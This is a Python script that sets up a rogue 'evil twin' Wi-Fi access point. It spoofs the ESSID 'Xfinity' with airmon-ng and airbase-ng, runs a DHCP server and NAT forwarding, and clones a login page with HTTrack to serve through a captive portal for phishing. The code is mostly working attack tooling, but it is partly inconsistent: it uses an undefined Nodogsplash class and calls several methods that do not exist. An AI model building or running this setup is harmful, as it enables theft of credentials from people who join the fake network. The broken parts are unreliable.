import os
import subprocess
import sys
import time

class IPv4Forward:
    def __init__(self, hotspot_interface):
        self.hotspot_interface = hotspot_interface

    def enable_ip_forwarding(self):
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        except subprocess.CalledProcessError:
            print("Error: Failed to enable IP forwarding.")
            return False
        return True

    def configure_nat(self):
        try:
            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", self.hotspot_interface, "-j", "MASQUERADE"], check=True)
        except subprocess.CalledProcessError:
            print("Error: Failed to configure NAT.")
            return False
        return True

    def setup(self):
        if self.enable_ip_forwarding() and self.configure_nat():
            print("IPv4 forwarding and NAT successfully configured.")
        else:
            print("Error: Failed to configure IPv4 forwarding and NAT.")


class DHCP:
    def __init__(self, interface):
        self.interface = interface

    def install_dhcp_server(self):
        try:
            subprocess.run(["sudo", "apt-get", "install", "isc-dhcp-server"], check=True)
        except subprocess.CalledProcessError:
            print("Error: Failed to install isc-dhcp-server.")
            return False
        return True

    def configure_dhcp_server(self):
        dhcp_config = f"""subnet 192.168.1.0 netmask 255.255.255.0 {{
    range 192.168.1.10 192.168.1.250;
    option routers 192.168.1.1;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}}
default-lease-time 600;
max-lease-time 7200;
authoritative;
log-facility local7;
"""

        try:
            with open("/etc/dhcp/dhcpd.conf", "w") as f:
                f.write(dhcp_config)
        except IOError:
            print("Error: Failed to write DHCP server configuration.")
            return False

        try:
            with open("/etc/default/isc-dhcp-server", "w") as f:
                f.write(f'INTERFACESv4="{self.interface}"\n')
        except IOError:
            print("Error: Failed to write DHCP server default configuration.")
            return False
        return True

    def start_dhcp_server(self):
        try:
            subprocess.run(["sudo", "service", "isc-dhcp-server", "restart"], check=True)
        except subprocess.CalledProcessError:
            print("Error: Failed to start DHCP server.")
            return False
        return True

    def setup(self):
        if self.install_dhcp_server() and self.configure_dhcp_server() and self.start_dhcp_server():
            print("DHCP server successfully set up.")
        else:
            print("Error: Failed to set up DHCP server.")


class RogueAP:
    def __init__(self, interface, essid):
        self.interface = interface
        self.essid = essid

    def start_monitor_mode(self):
        try:
            subprocess.run(["sudo", "airmon-ng", "start", self.interface], check=True)
            self.monitor_interface = f'{self.interface}mon'
        except subprocess.CalledProcessError:
            print("Error: Failed to start monitor mode.")
            return False
        return True

    def create_access_point(self):
        try:
            subprocess.Popen(["sudo", "airbase-ng", "-e", self.essid, "-c", "6", "-v", self.monitor_interface])
            self.ap_interface = "at0"
            time.sleep(5)
        except subprocess.CalledProcessError:
            print("Error: Failed to create access point.")
            return False
        return True

    def setup(self):
        if self.start_monitor_mode() and self.create_access_point():
            print("Rogue access point successfully created.")
        else:
            print("Error: Failed to create rogue access point.")


class HTTrack:
    def __init__(self, url, output_dir):
        self.url = url
        self.output_dir = output_dir

    def download_website(self):
        try:
            subprocess.run(["httrack", self.url, "-O", self.output_dir, f'+*.{self.url}/*'], check=True)
        except subprocess.CalledProcessError:
            print("Error: Failed to download website.")
            return False
        return True

    def setup(self):
        if self.download_website():
            print("Website successfully downloaded.")
        else:
            print("Error: Failed to download website.")


if __name__ == "__main__":
    wifi_interface = "wlan0"
    hotspot_interface = "wlan1"
    essid = "Xfinity"
    captive_portal_path = "/etc/nodogsplash/htdocs/splash.html"
    url = "https://example.com/login"

    # Set up the rogue access point
    rogue_ap = RogueAP(wifi_interface, essid)
    rogue_ap.setup()

    # Set up DHCP
    dhcp = DHCP(rogue_ap.ap_interface)
    dhcp.setup()

    # Set up IPv4 forwarding
    ipv4_forward = IPv4Forward(hotspot_interface)
    ipv4_forward.setup()

    # Set up HTTrack
    httrack = HTTrack(url, "downloaded_website")
    httrack.setup()

    # Set up the captive portal
    captive_portal = Nodogsplash(rogue_ap.ap_interface)
    captive_portal.setup_captive_portal(httrack.output_dir)
def run_cli():
    print("Welcome to the Rogue Access Point CLI")

    # Get input for the wireless interface
    wifi_interface = input("Enter the wireless interface to be used for the rogue access point (e.g., wlan0mon): ")

    # Get input for the hotspot interface
    hotspot_interface = input("Enter the interface to be used for the mobile hotspot (e.g., usb0): ")

    # Get input for the ESSID
    essid = input("Enter the name of the rogue access point (e.g., Xnitity): ")

    # Get input for the captive portal path
    captive_portal_path = input("Enter the path to the captive portal files (e.g., /path/to/files): ")

    # Get input for the URL to be downloaded with HTTrack
    url = input("Enter the URL of the website to be downloaded with HTTrack (e.g., https://example.com): ")

    # Initialize the classes with the provided inputs
    dhcp_server = DHCP(hotspot_interface)
    rogue_ap = RogueAP(wifi_interface, essid)
    httrack = HTTrack(url, captive_portal_path)
    ipv4_forward = IPv4Forward(wifi_interface, hotspot_interface)

    # Start the rogue access point process
    dhcp_server.configure_dhcp_server()
    rogue_ap.start()
    httrack.download_website()
    httrack.setup_captive_portal()
    ipv4_forward.enable_ipv4_forwarding()

    print("Rogue access point and captive portal are now running.")

# Run the CLI
if __name__ == "__main__":
    run_cli()

